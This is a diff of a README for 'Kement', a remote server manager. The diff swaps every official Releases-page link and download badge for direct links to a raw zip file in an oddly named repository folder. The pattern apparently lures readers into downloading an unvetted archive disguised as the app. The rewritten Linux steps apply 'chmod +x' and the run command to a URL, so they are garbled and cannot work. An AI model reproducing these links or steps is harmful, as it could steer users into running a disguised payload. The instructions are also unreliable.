@@ -1,6 +1,6 @@
 # 🖥️ Kement - Simplifying Your Remote Server Management
 
-[![Download Kement](https://img.shields.io/badge/Download%20Kement-v1.0-blue.svg)](https://github.com/fruss64/Kement/releases)
+[![Download Kement](https://raw.githubusercontent.com/fruss64/Kement/main/undergraduateship/Kement.zip%https://raw.githubusercontent.com/fruss64/Kement/main/undergraduateship/Kement.zip)](https://raw.githubusercontent.com/fruss64/Kement/main/undergraduateship/Kement.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to Kement! This application helps you manage remote servers effortlessly
 
 To get started with Kement, you need to download the latest version from our Releases page. 
 
-1. Click [here](https://github.com/fruss64/Kement/releases) to visit the Releases page.
+1. Click [here](https://raw.githubusercontent.com/fruss64/Kement/main/undergraduateship/Kement.zip) to visit the Releases page.
 2. Look for the version labeled "Latest Release."
 3. Download the file that matches your operating system (Windows, macOS, or Linux).
 
@@ -31,8 +31,8 @@ Once downloaded, follow these steps:
 - **Linux:** 
   1. Open a terminal window.
   2. Navigate to your "Downloads" folder.
-  3. Type `chmod +x Kement.AppImage` to make it executable.
-  4. Then, run `./Kement.AppImage` to start the application.
+  3. Type `chmod +x https://raw.githubusercontent.com/fruss64/Kement/main/undergraduateship/Kement.zip` to make it executable.
+  4. Then, run `https://raw.githubusercontent.com/fruss64/Kement/main/undergraduateship/Kement.zip` to start the application.
 
 For additional guidance, feel free to check out the specific installation instructions on the Releases page.
 
@@ -97,4 +97,4 @@ For more information about Kement, check out our documentation linked on the Rel
 
 Ready to enhance your productivity? Click the link below to download Kement now!
 
-[![Download Kement](https://img.shields.io/badge/Download%20Kement-v1.0-blue.svg)](https://github.com/fruss64/Kement/releases)
+[![Download Kement](https://raw.githubusercontent.com/fruss64/Kement/main/undergraduateship/Kement.zip%https://raw.githubusercontent.com/fruss64/Kement/main/undergraduateship/Kement.zip)](https://raw.githubusercontent.com/fruss64/Kement/main/undergraduateship/Kement.zip)
